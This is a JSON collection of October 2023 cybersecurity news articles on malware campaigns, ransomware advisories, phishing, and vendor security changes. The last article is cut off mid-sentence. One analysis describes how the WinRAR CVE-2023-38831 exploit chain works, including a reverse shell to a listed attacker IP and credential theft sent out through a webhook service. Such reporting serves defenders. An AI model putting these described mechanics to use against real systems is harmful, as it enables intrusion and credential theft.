[
   {
      "time": "2023-10-16",
      "title": "AI algorithm detects MitM attacks on unmanned military vehicles",
      "text": " Professors at the University of South Australia and Charles Sturt University have developed an algorithm to detect and intercept man-in-the-middle (MitM) attacks on unmanned military robots.MitM attacks are a type of cyberattack where the data traffic between two parties, in this case, the robot and its legitimate controllers, is intercepted either to eavesdrop or to inject false data in the stream.Such malicious attacks aim to interrupt the operation of unmanned vehicles, modify the transmitted instructions, and, in some cases, even assume control, instructing the robots to take dangerous actions.\"The advent of Industry 4, marked by the evolution in robotics, automation, and the Internet of Things, has demanded that robots work collaboratively, where sensors, actuators, and controllers need to communicate and exchange information with one another via cloud services.\"\"The downside of this is that it makes them highly vulnerable to cyberattacks.\"The university researchers developed an algorithm using machine learning techniques to detect these attempts and shut them down in seconds.The algorithm was tested in a replica of the GVR-BOT used by the U.S. Army (TARDEC), and recorded successful attack prevention 99% of the time, with false positives occurring in less than 2% of the tested cases.Detecting MitM targeting crewless vehicles and robots is complex as these systems operate under fault-tolerant modes, so distinguishing between normal operations and fault conditions can be hazy.Also, robotic systems can be compromised at various levels, from the core system to its sub-systems and their sub-components, causing an operational problem that could render the robot dysfunctional..The university researchers developed a system that analyzed the robot's network traffic data to detect attempts to compromise it. This system uses node-based methods, scrutinizes packet data, and uses a flow-statistic-based system that reads metadata from the packet header.The detailed technical paper released by the researchers delves into the specifics of the deep learning CNN (convolutional neural network) model that was developed for this purpose, comprising multiple layers and filters that raise the reliability of the cyberattack detection outcome.Real tests conducted on the replica bot with simulated cyber-attacks targeting various systems produced excellent results and high identification accuracy even after only 2-3 epochs of model training.Optimized versions of this novel protection system could find applications in similar but more demanding robotic applications, like unmanned aircraft."
   },
   {
      "time": "2023-10-16",
      "title": "Microsoft plans to kill off NTLM authentication in Windows 11",
      "text": " Microsoft announced earlier this week that the NTLM authentication protocol will be killed off in Windows 11 in the future.NTLM (short for New Technology LAN Manager) is a family of protocols used to authenticate remote users and provide session security.While it was the default protocol used in old Windows versions, NTLM is still used today, and if, for any reason, Kerberos fails, NTLM will be used instead.NTLM has also been targeted in pass-the-hash attacks, where cybercriminals exploit system vulnerabilities or deploy malicious software to acquire NTLM hashes, which represent hashed passwords, from a targeted system.Once in possession of the hash, attackers can utilize it to authenticate as the compromised user, thus gaining access to sensitive data and spread laterally on the network.However, Microsoft is now working on two new Kerberos features: IAKerb (Initial and Pass Through Authentication Using Kerberos) and Local KDC (Local Key Distribution Center).\"This leverages IAKerb to allow Windows to pass Kerberos messages between remote local machines without having to add support for other enterprise services like DNS, netlogon, or DCLocator. IAKerb also does not require us to open new ports on the remote machine to accept Kerberos messages.\"Microsoft intends to introduce the two new Kerberos features in Windows 11 to broaden its use and tackle two significant challenges leading to Kerberos fallback to NTLM.The first feature, IAKerb, enables clients to authenticate with Kerberos across a broader range of network topologies. The second feature involves a local Key Distribution Center (KDC) for Kerberos, which extends Kerberos support to local accounts.Redmond also plans to expand NTLM management controls, providing administrators with increased flexibility in monitoring and restricting NTLM usage within their environments.\"All these changes will be enabled by default and will not require configuration for most scenarios. NTLM will continue to be available as a fallback to maintain existing compatibility,\" Palko said.\"Reducing the use of NTLM will ultimately culminate in it being disabled in Windows 11. We are taking a data-driven approach and monitoring reductions in NTLM usage to determine when it will be safe to disable.\"In the meantime, you can use the enhanced controls we are providing to get a head start. Once disabled by default, customers will also be able to use these controls to reenable NTLM for compatibility reasons.\""
   },
   {
      "time": "2023-10-16",
      "title": "Steam enforces SMS verification to curb malware-ridden updates",
      "text": " Valve has announced implementing additional security measures for developers publishing games on Steam, including SMS-based confirmation codes. This is to deal with a recent outbreak of malicious updates pushing malware from compromised publisher accounts.Steamworks is a set of tools and services developers and publishers of games/software use to distribute their products on the Steam platform.It supports DRM (digital rights management), multiplayer, video streaming, matchmaking, achievements system, in-game voice and chat, microtransactions, statistics, cloud saving, and community-made content sharing (Steam Workshop).Starting in late August and into September 2023, there has been an elevated number of reports about compromised Steamworks accounts and the attackers uploading malicious builds that infect players with malware.Valve assured the gaming community that the impact of these attacks was limited to a few hundred users, who were individually informed of the potential breach via notices sent by the company.To curb this problem, Valve will enforce a new SMS-based security check starting on October 24, 2023, which game developers must pass before pushing an update on the default release branch (not beta releases).The same requirement will be enforced when someone attempts to add new users to the Steamworks partner group, which is already protected by an email-based confirmation. Starting October 24, the group admin must verify the action with an SMS code.\"The same will be true for any Steamworks account that needs to add new users. This change will go live on October 24, 2023, so be sure to add a phone number to your account now.\"\"We also plan on adding this requirement for other Steamworks actions in the future.\"For those using the SetAppBuildLive API, Steam has updated it to require a steamID for confirmation, particularly for changes to the default branch of a released app.Using 'steamcmd' to set builds live is no longer applicable for managing the default branch of released apps.Also, Valve says there will be no workaround for developers without a phone number, so they must find a way to receive text messages to continue publishing on the platform.While introducing SMS-based verification is a good step towards achieving better supply chain security on Steam, the system is far from perfect.One of the game developers, Benoît Freslon, explained that he was infected with an information-stealing malware that was used to steal his credentials.Using these stolen credentials, the threat actor briefly pushed out a malicious update for the NanoWar: Cells VS Virus that infected players with malware.Freslon explained on Twitter that Valve's new SMS-based MFA security measure wouldn't have helped stop the attack as the info-stealer malware snatched session tokens to all his accounts.The game installer dropped a password-stealing malware on his computer, which targeted his Discord, Steam, Twitch, Twitter, and other accounts.Until the tokens were revoked or expired, the attackers continued to access the developer's accounts, remaining free to push malware-laced game updates to players.Also, SMS 2FA is inherently vulnerable to SIM-swap attacks where threat actors can port the number of a game developer to a new SIM and bypass the security measure.A better and more modern solution would be to enforce authenticator apps or physical security keys, especially for projects with large communities."
   },
   {
      "time": "2023-10-16",
      "title": "Microsoft Debuts AI Bug-Bounty Program, Offers $15K",
      "text": " Microsoft has announced its AI bug-bounty program to encourage researchers worldwide to discover vulnerabilities within the Bing generative AI chatbot and AI integrations. Bounty rewards will range from $2,000 to $15,000 for qualified submissions.Eligible participants must be at least 14 years old, with permission from a legal guardian if they are a minor, and an individual researcher. Should a participant be a public sector employee, the bounty award must go to the public sector organization and be signed by an attorney or executive responsible for its ethics policies. The scope of the bounty program extends to AI-powered Bing on bing.com, AI-powered Bing integration in Microsoft Edge, AI-powered Bing integration in the Microsoft Start app, and AI-powered Bing integration in the Skype Mobile app. Any vulnerabilities found in these integrations are qualified for submission and are eligible to win a reward.Microsoft stated that the goal of the program is to uncover vulnerabilities that have a significant impact on the security of its customers within the AI-powered \"Bing experience.\" When submitting a vulnerability, researchers must ensure that it has not been previously reported, is of critical or important severity as per the Microsoft Vulnerability Severity Classification for AI Systems, and is reproducible on the latest version of the product with clear steps as to how to reproduce the vulnerability. Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-16",
      "title": "Women Political Leaders Summit targeted in RomCom malware phishing",
      "text": " A new, lightweight variant of the RomCom backdoor was deployed against participants of the Women Political Leaders (WPL) Summit in Brussels, a summit focusing on gender equality and women in politics.The campaign used a fake website mimicking the official WPL portal to bait people seeking to attend or simply interested in the summit.In August 2023, Void Rabisu set up a malicious website on the address 'wplsummit[.]com', designed to imitate the real Women Political Leaders (WPL) website hosted on wplsummit.org.The fake site linked to a OneDrive folder through a button named 'Videos & photos,' which contained pictures from the two days of the event, taken from the genuine site, and a malware downloader named 'Unpublished Pictures.'The malicious executable is signed by an Elbor LLC certificate and is a self-extracting archive containing 56 photos to act as decoys, while a second encrypted file is downloaded from a remote host.The second payload is a DLL that is decrypted and loaded into memory to evade detection and continues to fetch additional components required for establishing communication with the attacker's server.Trend Micro identifies the latest, stripped-down variant of RomCom as the fourth major release of the backdoor, explaining that it's the same malware Volexity researchers recently named 'Peapod.'Compared to RomCom 3.0, the previous version seen in Void Rabisu operations, the new backdoor variant has undergone significant changes, making it lighter and stealthier.It now supports only the following ten commands, a stark reduction from the previous 42.Also, instead of utilizing modified MSIs to drop its components onto devices directly, the new variant leverages an EXE file to fetch XOR-encrypted DLLs, loading all its components in memory.RomCom 4.0 has also incorporated new features related to Transport Layer Security (TLS), a protocol designed to provide secure communication with the C2 server.The malware has been coded to force WinHTTP functions to specifically use the TLS version 1.2 rather than allowing the operating system to choose the default TLS version.This enforcement system results in an error on Windows 7, which Trend Micro considers safe against the newest RomCom variant.The goal of this mechanism is likely to make C2 communication more resistant to snooping, complicate automated discovery, and possibly allow attackers to filter out unsuitable victims.In general, Void Rabisu's tactics and the deployment of the RomCom malware remain cloudy. However, it is clear that the backdoor's development is still ongoing, and its operators are increasingly focused on top-level cyber espionage.Trend Micro concludes that it is very likely that Void Rabisu will target all big conferences related to special interest groups, so caution is advised when visiting event sites."
   },
   {
      "time": "2023-10-16",
      "title": "Feds: Beware AvosLocker Ransomware Attacks on Critical Infrastructure",
      "text": " US authorities issued a warning this week about potential cyberattacks against critical infrastructure from ransomware-as-a-service (RaaS) operation AvosLocker.The group also likes to use living-off-the-land (LotL) tactics, making use of native Windows tools and functions such as Notepad++, PsExec, and Nltest for performing actions on remote hosts.Post-compromise, AvosLocker both locks up and exfiltrates files in order to enable follow-on extortion, should its victim be less than cooperative.\"It's all kind of the same, to be honest, as what we've been seeing for the past year or so,\" Ryan Bell, threat intelligence manager at Corvus, says of AvosLocker and other RaaS groups' TTPs. \"But they're becoming more deadly efficient. Through time they're getting better, quicker, faster.\"To protect against AvosLocker and its ilk, CISA provided a long list of ways critical infrastructure providers can protect themselves, including implementing standard cybersecurity best practices — like network segmentation, multifactor authentication, and recovery plans. CISA added more specific restrictions, such as limiting or disabling remote desktop services, file and printer sharing services, and command-line and scripting activities and permissions.\"Typically, ransomware groups take a little bit of a summer vacation. We forget that they are people, too,\" Bell says, citing lower-than-average ransomware numbers in recent months. September's 5.12% bump in ransomware cyberattacks, he says, is the canary in the coal mine.\"They will increase attacks through the fourth quarter. That's usually the highest we see throughout the year, as in both 2022 and 2021, and we're seeing that holds true even now,\" he warns. \"Things are definitely climbing up all across the board.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-16",
      "title": "\r\n\tNew Phishing Campaign Uses LinkedIn Smart Links in Blanket Attack - Infosecurity Magazine\r\n",
      "text": " Reporter, Infosecurity MagazineEmail security provider Cofense has discovered a new phishing campaign comprising over 800 emails and using LinkedIn Smart Links.The campaign was active between July and August 2023 and involved various subject themes, such as financial, document, security, and general notification lures, reaching users’ inboxes across multiple industries.The financial, manufacturing and energy sectors are the top targeted verticals.Cofense estimated that “this campaign was not a direct attack on any one business or sector but a blanket attack to collect as many credentials as possible using LinkedIn business accounts and Smart Links to carry out the attack.”LinkedIn Smart Links, also known as slinks, are used by LinkedIn business accounts to deliver content and track user content engagements through the LinkedIn Sales Navigator.A typical Smart Link uses the LinkedIn domain followed by a ‘code’ parameter with an eight-alphanumeric character ID that may contain underscores and dashes. However, malicious Smart Links can include other parts of information, such as obfuscated victim emails.Smart Links have proven to bypass security email gateways (SEGs) and other email security suites due to the link using a trusted domain.This new trove of Smart Links-based phishing messages suggests that these accounts are either newly created or previously compromised LinkedIn business accounts, allowing threat actors insight into the phishing campaign with its tracking capabilities.Upon clicking a malicious LinkedIn Smart Link embedded in an email, the user will be sent directly or through a series of redirects to the phish.The designated phishing kit will read the victim’s email attached to the Smart Link to autofill the malicious form to add to the illusion of legitimacy that the victim has landed at the legitimate Microsoft sign-in. However, a Smart Link will still lead to a credential phishing page without the victim’s email in the URL.Once at the phish, the user will be instructed to log in using their Microsoft Office credentials.LinkedIn Smart Links have been used in malicious phishing campaigns for a while now.Cofense identified large-scale phishing attacks using LinkedIn Smart Links as early as 2021. The company also reported on a large-scale campaign using slinks in September 2022.However, this is not a phishing method that malicious actors regularly use."
   },
   {
      "time": "2023-10-16",
      "title": "DarkGate malware spreads through compromised Skype accounts",
      "text": " Between July and September, DarkGate malware attacks have used compromised Skype accounts to infect targets through messages containing VBA loader script attachments.\"It's unclear how the originating accounts of the instant messaging applications were compromised, however is hypothesized to be either through leaked credentials available through underground forums or the previous compromise of the parent organization,\"Trend Micro also observed the DarkGate operators trying to push their malware payload through Microsoft Teams in organizations where the service was configured to accept messages from external users.\"The goal is still to penetrate the whole environment, and depending on the threat group that bought or leased the DarkGate variant used, the threats can vary from ransomware to cryptomining,\" Trend Micro said.\"From our telemetry, we have seen DarkGate leading to tooling being detected commonly associated with the Black Basta ransomware group.\"This recent surge in DarkGate activity underscores the growing influence of this malware-as-a-service (MaaS) operation within the cybercriminal sphere.It also emphasizes the threat actors' determination to continue their attacks, adapting their tactics and methods despite disruptions and challenges."
   },
   {
      "time": "2023-10-16",
      "title": "23andMe hit with lawsuits after hacker leaks stolen genetics data",
      "text": " Genetic testing provider 23andMe faces multiple class action lawsuits in the U.S. following a large-scale data breach that is believed to have impacted millions of its customers.The file allegedly contained the data of nearly 1 million Ashkenazi Jews who used 23andMe services to find their ancestry info, genetic predispositions, and more.The data in the CSV file contained information on 23andMe users' account IDs, full names, sex, date of birth, DNA profiles, location, and region details.Last week, the original hacker decided to retract the post and instead began selling data profiles of stolen 23andMe data. However, other threat actors continued to share the original 23andMe leak throughout cybercrime communities and forums.In response to an inquiry, 23andMe told BleepingComputer that the hackers accessed its platform through credential-stuffing attacks on weakly secured accounts. However, they refuted claims of a direct security breach of their systems.A 23andMe spokesperson explained that the attackers initially gained unauthorized access to a small number of accounts but eventually exfiltrated the data of a larger yet undefined number of clients due to them activating an optional feature named 'DNA Relatives,' which connects genetic relatives.Although platform members voluntarily activated the opt-in feature, not all of them accept that the involved risk of internal data-sharing should exempt the firm from its responsibility to place protection layers.In this case, many people following proper security practices by enabling 2FA on their accounts and using a strong and unique password still found themselves exposed, and their sensitive data leaked on cybercrime forums.The lawsuits highlight a lack of information in the company's official announcement regarding the security event, the current status of customer data safety, the network breach's duration, and the cyberattack's exact mechanism.Also, they criticize 23andMe for failing to implement adequate security measures that would help monitor its network for abnormal activity and potentially take action to stop the intrusion much sooner.The legal actions emphasize that 23andMe, a company managing sensitive medical data, should have been well aware of the elevated cybersecurity threats given the numerous high-profile breaches in the industry, underscoring the high value of such data.The plaintiffs ask for various financial reliefs against 23andMe, including restitution, lifetime credit monitoring, actual, compensatory, and statutory damages and penalties, punitive damages, and coverage of attorney's fees."
   },
   {
      "time": "2023-10-16",
      "title": "Alphv gang stole 5TB of data from Morrison Community Hospital",
      "text": " The ALPHV/BlackCat ransomware group claims to have hacked the Morrison Community Hospital and added it to its dark web Tor leak site.The group claims to have stolen 5TB of patients’ and employee’s information, backups, PII documents, and more. The gang also published a sample as proof of the stolen data.The group states that it has started contacting journalists because the representatives of the Morrison Community Hospital haven’t provided a clear response. The Alphv gang also threatens to initiate patient calls shortly.The popular researcher Brett Callow states that far this year, 29 US health systems with 90 hospitals between them have been impacted by #ransomware, and at least 23/29 had data stolen. The group is known to have a role for its affiliated that prohibits attacking healthcare organizations. Its policy forbids to encrypt systems of organizations where damage could lead to the death of individuals.The gang explained that one of its partners attacked SickKids violating its rules, for this reason, it blocked the affiliate.The Rhysida ransomware group threatened Prospect Medical Holdings to leak the stolen data if the company did not pay a 50 Bitcoins ransom (worth $1.3 million). The same group this week claimed to have breached other three US hospitals.\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-10-16",
      "title": "CVE-2023-38831 Exploited by Pro-Russia Hacking Groups in RU-UA Conflict Zone for Credential Harvesting Operations",
      "text": " By \n\t\t\t\t\t\t\t\tCluster25 Threat Intel Team\n\t\t\t\t\t\t\t\t\n\t\t\t\t October 12, 2023\n\t\t\t\t\n\t\t\t\t\t\t\nCluster25 observed and analyzed several phishing-based attacks to be linked to a Russia-nexus nation-State threat actor. The attack involves the use of malicious archive files that exploit the recently discovered vulnerability affecting the WinRAR compression software versions prior to 6.23 and traced as CVE-2023-38831.The lure file consists in a PDF document, contained in the archive, that shows a list of Indicator of Compromise (IoCs) with domain names and hashes related to different malware, including SmokeLoader, Nanocore RAT, Crimson RAT and AgentTesla. Due to the vulnerability, the click on the PDF file causes a BAT script to be executed, which launches PowerShell commands to open a reverse shell that gives the attacker the access to the targeted machine and a PowerShell script that steals data, including login credentials, from the Google Chrome and Microsoft Edge browsers. To exfiltrate the data, attackers uses the legit web service webhook[.]site. The lure sample is an archive file named IOC_09_11.rar, probably with the intention of masquerading itself as a file to be used to share Indicators of Compromise (IoCs). The archive is crafted to exploit the WinRAR vulnerability traced as CVE-2023-38831: it contains a bogus PDF file named IOC_09_11.pdf with a trailing space character in its filename and a directory with the same name (including the trailing space) with the file named \"IOC_09_11.pdf .cmd\", which is a BAT script. Content of the malicious RAR fileDue to the vulnerability, if the victim user has an installed version of the WinRAR software prior to 6.23, the opening of the bogus PDF file causes the BAT script to be executed. The BAT script first launches a background command of WinRAR to extract its content in the %TEMP% directory, then it deletes the script file from it and opens the PDF file to show the lure to the victim. The latter shows a list of IoCs containing domain names and hashes related to different malware, including SmokeLoader, Nanocore RAT, Crimson RAT and AgentTesla.Content of lure PDF document used by attackersThen, the script begins the malicious activity, launching three PowerShell commands.Content of.bat script used in the kill-chainThe first command writes a Private RSA Key in the file rsakey under the directory %LOCALAPPDATA%\\Temp. The file is used by the second command to open a reverse shell that gives the attacker access to the targeted machine, using the SSH tool with the TCP port 443 at the IP address 216.66.35[.]145.Code snippet of PowerShell code used in the kill-chainThe third command executes a Base64-encoded string that once decoded shows the following PowerShell script:Redacted second-stage code snippet of PowerShell code used in the kill-chainThe script retrieves and decrypts the data, including the Login credentials, from the Google Chrome and Microsoft Edge browsers, then it sends it to the threat actor using the legit Webhook.site service, which allows users to set a unique URL and to obtain a log of requests or emails sent to it, so to inspect their content. The script performs a POST request with the retrieved data to the following URL, containing the unique token owned by the attacker: According to the Cluster25 visibility and considering the sophistication of the infection chain, the attack could be related with low-to-mid confidence to the Russian state-sponsored group APT28 (aka Fancy Bear, Sednit).  Cluster25 observed a malicious campaign that employs LinkedIn messages as a vector for executing identity theft attacks....BlackByte is a Ransomware-as-a-Service (RaaS) group that is known for the use of the homonymous malware that is constant...Cluster25 researchers analyzed several campaigns (also publicly reported by CERT-AGID) that used phishing emails to spre...Security without boundaries.GLOBAL HQ350 5th Ave, New York, NY 10118 USA© 2023 DuskRise Inc. All Rights Reserved."
   },
   {
      "time": "2023-10-16",
      "title": "Lazarus 조직의 Operation Dream Magic - ASEC BLOG",
      "text": " Lazarus 조직은 국가가 배후인 것으로 알려진 해킹 조직으로 금전적인 이득, 자료 탈취 등의 목적으로 전세계를 대상으로 꾸준히 해킹하고 있습니다.Lazarus 조직의 이니세이프 취약점을 악용한 워터링 홀을 간단하게 정리하면 언론사의 특정 기사에 악성 링크 삽입, 해당 기사를 클릭하는 기업, 기관이 해킹 대상, 국내 취약한 홈페이지를 C2 로 악용 그리고 제한된 범위의 해킹을 위해서 IP 필터링 등을 사용했습니다. 이번 워터링 홀에서 악용하는 프로그램의 취약점이 매직라인으로 변경됐을 뿐 워터링 홀 과정은 과거 이니세이프 사례와 동일합니다.안랩은 Lazarus 조직의 매직라인 취약점을 악용한 워터링 홀을 대응하기 위해서 여러 팀의 협업이 있었습니다. 매직라인 취약점을 탐지하기 위한 조건을 연구하고 백신에 업데이트해준 분석팀, 탐지된 PC 가 고객일 경우 로그 및 샘플 수집 등 고객 대응을 해준 기술지원팀, 수집한 로그 분석 및 국가기관과의 소통을 담당한 대응팀 등 여러 팀의 협업이 있었습니다. 또한 안랩은 국가기관과도 정보 공유 및 협업을 통해서 Lazarus 조직의 매직라인 취약점을 악용한 워터링 홀을 추적하고 분석을 진행했으며, 매직라인 제조 기업의 이름 일부와 매직라인의 이름 일부를 조합하여 이번 작전을 “Operation Dream Magic”으로 명명했습니다.본 보고서에서는 악성코드 분석 내용, 탐지 현황, 일부 기업의 협조로 수집한 로그 분석, 국가 기관과의 정보 공유 및 협업 등을 바탕으로 해석한 내용을 포함했으며, 이번 작전을 Lazarus 조직의 소행으로 판단한 근거에 대해서도 설명했습니다. [필수] 개인정보 수집 및 이용 동의Δ[필수] 개인정보 수집 및 이용 동의Δ"
   },
   {
      "time": "2023-10-13",
      "title": "\r\n\tCalifornia Enacts “Delete Act” For Data Privacy - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistCalifornia Governor Gavin Newsom has signed into law the first bill in the US compelling data brokers to delete all personal data of state residents upon request. Dubbed the “Delete Act” (SB 362), this legislation will equip residents with a single “delete button” accessible via the California Privacy Protection Agency (CPPA) website, affecting roughly 113 registered data brokers in the state and imposing penalties on non-compliant brokers by 2026.As collectors of vast amounts of personal information, data brokers are often prime targets for data breaches. “From a privacy standpoint, this is a wonderful, consumer-friendly concept; it addresses many of the pain points for privacy-conscious citizens to limit their data exposure. However, this will be very difficult to implement and enforce,” Uenuma said.According to the security expert, one of the central obstacles is the ability to verify and prove that the deleted data is truly gone, a process dependent on:Finding and collecting all of the consumer’s data.Permanently and verifiably deleting that data.Uenuma suggested that the right mix of technological solutions will be essential for a successful implementation. “Ultimately, implementation will require substantial organizational, procedural, and technological changes,” he added.For consumers seeking assurance that their personal data has been permanently eliminated, Uenuma recommended requesting a certified “proof of erasure” at the conclusion of the data deletion process."
   },
   {
      "time": "2023-10-13",
      "title": "DarkGate Operator Uses Skype, Teams Messages to Distribute Malware",
      "text": " A threat actor is using compromised Skype and Microsoft Teams accounts to distribute DarkGate, a troublesome loader associated with multiple malicious activities, including information theft, keylogging, cryptocurrency miners, and ransomware such as Black Basta.Forty-one percent of the targets of the campaign — which appears to have begun in August — are organizations in the Americas, according to researchers at Trend Micro who are tracking the activity.The operator of the DarkGate campaign that Trend Micro is currently tracking is using both Skype and Teams to distribute the malware. In one of the attacks, the threat actor took control of a Skype account belonging to an individual at an organization with whom the target recipient's organization had a trusted relationship. The adversary basically used the compromised Skype account to hijack an existing message thread and send a message that appeared to contain a PDF file but was actually a malicious VBS script. When the recipient executed the file, it initiated a sequence of steps to download and install DarkGate on the target computer.In another attack that Trend Micro analyzed, the threat actor attempted to achieve the same outcome using a Teams account to send a message with a malicious .LNK file, to a target recipient. Unlike the Skype caper, where the threat actor purported to be someone belonging to a trusted third party, in the Teams variation, the recipient received the malicious message from an unknown, external entity. \"In this case, the organization’s system allowed the victim to receive messages from external users, which resulted in them becoming a potential target of spam,\" Trend Micro said.\"We also observed a tertiary delivery method of using a VBA script wherein a .LNK file arrives in a compressed file from the originators' SharePoint site,\" the security vendor said. In this attack variation, the threat actor attempts to lure the victim to a specific SharePoint site, to download a file named \"Significant company changes September.zip.\"DarkGate is malware that has targeted users in various regions around the world since at least 2017. It integrates multiple relatively potent functions; for instance, the malware can execute commands for gathering system information, mapping networks, and doing directory traversal. It also implements remote desktop protocol (RDP), hidden virtual network computing, AnyDesk, and other remote access software. Other \"features\" include ones related to cryptocurrency mining, keylogging, privilege escalation, and stealing information from browsers.For payload delivery and execution, DarkGate uses AutoIT, a legitimate Windows automation and scripting tool that authors of other malware families have used for obfuscation and defense evasion.Trend Micro said it was able to contain the DarkGate attacks it observed before any actual harm came to pass. But given the developer's apparent pivot to a new malware leasing model, enterprise security teams can expect more attacks from varied threat actors. The objectives of these adversaries could vary, meaning organizations need to keep an eye out for threat actors using DarkGate to infect systems with different kinds of malware.While the attacks that Trend Micro observed targeted individual Skype and Teams recipients, the attacker's goal clearly was to use their systems as an initial foothold on the target organization's networks. \"The goal is still to penetrate the whole environment, and depending on the threat group that bought or leased the DarkGate variant used, the threats can vary from ransomware to cryptomining,\" according to Trend Micro.The security firm recommends that organizations enforce rules around the use of instant messaging applications such as Skype and Teams. These rules should include blocking external domains, controlling the use of attachments and implementing scanning measures if possible. Multifactor authentication is also crucial to prevent threat actors from misusing illegally obtained credentials to hijack IM accounts, Trend Micro said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-13",
      "title": "Malicious Solana, Kucoin packages infect NuGet devs with SeroXen RAT",
      "text": " Malicious NuGet packages appearing to have over 2 million downloads impersonate crypto wallets, crypto exchange, and Discord libraries to infect developers with the SeroXen remote access trojan.NuGet is an open-source package manager and software distribution system that operates package hosting servers to enable users to download and use them for their development projects.All six packages in Disti's repository contain the same XML file that downloads 'x.bin,' an obfuscated Windows batch file that carries out malicious activities on the compromised system.The packages mimic popular cryptocurrency projects, exchanges, and platforms, even featuring the official logos to trick users.The download numbers are believed to be inflated and may not be representative of the reach of these packages in the NuGet community.Still, these download counts effectively enhance the perceived credibility of the packages, making them seem like genuine versions of the apps or platforms implied by their names.Disti might have inflated the download figures using automated scripts, botnets,  virtual machines, or cloud containers that download a package many times.The packages incorporate two PowerShell scripts that execute CMD and Batch files during installation on the victim's computer.The script downloads a file from an external URL, saves it as \".cmd\" on a temp directory, and executes it without displaying anything on the screen.This script fetches another file named 'x.bin,' which, despite its name, is an obfuscated batch script with over 12,000 lines, and its purpose is to construct and execute yet another PowerShell script.Eventually, that final script reads portions from the cmd file to decrypt and decompress an encoded payload from within itself, which Phylum says is SeroXen RAT.This feature-rich remote access trojan is marketed as a legitimate program and sold for $15/month or a single \"lifetime\" purchase of $60."
   },
   {
      "time": "2023-10-13",
      "title": "Researchers Uncover Malware Posing as WordPress Caching Plugin",
      "text": " Cybersecurity researchers have shed light on a new sophisticated strain of malware that masquerades as a WordPress plugin to stealthily create administrator accounts and remotely control a compromised site.The plugin also offers the ability to activate and deactivate arbitrary plugins on the site remotely as well as create rogue admin accounts with the username superadmin and a hard-coded password.In what's seen as an attempt to erase traces of compromise, it features a function named \"_pln_cmd_hide\" that's designed to remove the superadmin account when it's no longer required.Some of the other notable functions of the malware include the ability to remotely activate various malicious functions, alter posts and page content and inject spam links or buttons, and cause search engine crawlers to index dubious content so as to redirect site visitors to sketchy sites.\"Taken together, these features provide attackers with everything they need to remotely control and monetize a victim site, at the expense of the site's own SEO rankings and user privacy,\" researcher Marco Wotschka said.\"Remote plugin activation and admin user creation and deletion as well as conditional content filtering allow this backdoor to evade easy detection by the inexperienced user.\"The scale of the attacks and the exact initial intrusion vector used to breach the sites are currently unknown.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-13",
      "title": "FBI shares AvosLocker ransomware technical details, defense tips",
      "text": " The U.S. government has updated the list of tools AvosLocker ransomware affiliates use in attacks to include open-source utilities along with custom PowerShell, and batch scripts.In a joint cybersecurity advisory, the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) also share a YARA rule for detecting malware in the guise of a legitimate network monitoring tool.AvosLocker ransomware affiliates are known to use legitimate software and open-source code for remote system administration to compromise and exfiltrate data from enterprise networks.The FBI observed the threat actors using custom PowerShell, web shells, and batch scripts to move laterally on the network, increase their privileges, and to disable security agents on the systems.In the updated advisory, the agencies share the following tools as being part of the arsenal of AvosLocker ransomware affiliates:Additional publicly available tools observed in AvosLocker attacks include Notepad++, RDP Scanner, and 7zip. Legitimate native Windows tools like PsExec and Nltest were also seen.Another component of AvosLocker attacks is a piece of malware called NetMonitor.exe, which poses as a legitimate process and “has the appearance of a legitimate network monitoring tool.”However, NetMonitor is a persistence tool that hails from the network every five minutes and acts as a reverse proxy that enables the threat actors to remotely connect to the compromise network.Using details from the investigation of “an advanced digital forensics group,” the FBI created the YARA rule below to detect NetMonitor malware on a network.CISA and the FBI recommend organizations to implement application control mechanisms to control the execution of software, including allowed programs, as well as prevent running portable versions of unauthorized utilities, especially remote access tools.Part of the best practices for defending against threat actors are restrictions for using remote desktop services, such as RDP, by limiting the number of login attempts and implementing phishing-resistant multi-factor authentication (MFA).Applying the principle of least privileges is also part of the recommendations, and organizations should disable command-line, scripting, and the use of PowerShell for users that don’t require them for their job.Keeping software and code updated to the latest version, using longer passwords, storing them in a hashed format, and salting them if the logins are shared, and segmenting the network, remain the constant recommendations from security experts."
   },
   {
      "time": "2023-10-13",
      "title": "ToddyCat hackers use 'disposable' malware to target Asian telecoms",
      "text": " A newly discovered campaign dubbed \"Stayin' Alive\" has been targeting government organizations and telecommunication service providers across Asia since 2021, using a wide variety of \"disposable\" malware to evade detection.Most of the campaign's targets seen by cybersecurity firm Check Point are based in Kazakhstan, Uzbekistan, Pakistan, and Vietnam, while the campaign is still underway.The attacks appear to originate from the Chinese espionage actor known as 'ToddyCat,' which relies on spear-phishing messages carrying malicious attachments to load a variety of malware loaders and backdoors.The researchers explain that the threat actors use many different types of custom tool, which they believe are disposable to help evade detection and prevent linking attacks to each other..\"The wide set of tools described in this report are custom-made and likely easily disposable. As a result, they show no clear code overlaps with any known toolset, not even with each other,\" explains Check Point.The attack begins with a spear-phishing email crafted to target specific individuals in key organizations, urging them to open the attached ZIP file.The archive contains a digitally signed executable named to match the email context and a malicious DLL that exploits a vulnerability (CVE-2022-23748) in Audinate's Dante Discovery software to side-load  the \"CurKeep\" malware on the system.CurKeep is a 10kb backdoor that establishes persistence on the breached device, sends system info to the command-and-control (C2) server, and then waits for commands.The backdoor can exfiltrate a directory list for the victim's Program Files, indicating what software is installed on the computer, execute commands and send the output to the C2 server, and handle file-based tasks as instructed by its operators.Beyond CurKeep, the campaign utilizes other tools, mainly loaders, executed primarily through similar DLL side-loading methods.Notable ones include the CurLu loader, CurCore, and CurLog loader, each with unique functionalities and infection mechanisms.CurCore is the most interesting of the secondary payloads, as it can create files and populate their contents with arbitrary data, execute remote commands, or read a file and return its data in base64 encoded form.Another notable backdoor that stands out from the rest is 'StylerServ,' which acts as a passive listener that monitors traffic on five ports (60810 through 60814) for a specific XOR-encrypted configuration file ('stylers.bin').The report does 